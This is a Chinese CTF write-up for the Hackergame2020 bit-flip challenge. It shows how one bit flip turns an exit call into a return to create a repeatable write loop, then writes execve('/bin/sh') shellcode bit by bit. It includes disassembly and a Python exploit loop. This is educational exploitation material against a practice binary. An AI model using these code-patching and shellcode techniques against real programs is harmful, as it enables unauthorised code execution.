# Hackergame2020 超精准的宇宙射线模拟器 WP

## 题目简述

程序把自身代码段改成可写，然后允许用户翻转任意地址的一个 bit，随后调用 `exit`。一次 bit flip 看似不足以执行任意代码，关键是先把退出调用改成返回，从而建立可重复输入循环，再逐 bit 写入 shellcode。

## 解题过程

在 `0x401295` 有一条相对调用：

```text
E8 26 FE FF FF    call 0x4010c0
```

翻转第二个字节 `0x26` 的 bit 6，得到 `0x66`：

```text
E8 66 FE FF FF    call 0x401100
```

`0x401100` 的路径直接返回。原本调用 `exit` 后不可达的代码现在继续执行，打印 `Invalid input` 并回到读入位置，于是第一次翻转创造了可无限使用的翻转原语。

接下来把 shellcode 放到原 `exit` 入口 `0x4010c0`。对目标字节与原字节做异或，异或结果中为 1 的每一位都调用一次 flip：

```python
target = 0x401295
shellcode_start = 0x4010C0

flip(target + 1, 6)  # 0x26 -> 0x66，建立循环

for offset, wanted in enumerate(shellcode):
    diff = wanted ^ elf.read(shellcode_start + offset, 1)[0]
    for bit in range(8):
        if (diff >> bit) & 1:
            flip(shellcode_start + offset, bit)

flip(target + 1, 6)  # 恢复 0x66 -> 0x26
```

官方 shellcode 长 27 字节，执行 `execve("/bin/sh", ...)`。最后恢复第一次翻转，控制流再次调用 `0x4010c0`，但那里已是 shellcode，于是得到 shell 并读取 flag。

## 方法总结

弱原语的价值取决于能否放大：这里一个 bit 不直接改成 shellcode，而是先改控制流，获得无限次同类操作，再完成任意代码写入。分析受限写原语时，应优先寻找循环边、退出路径、错误恢复和计数器等可提升调用次数的目标。
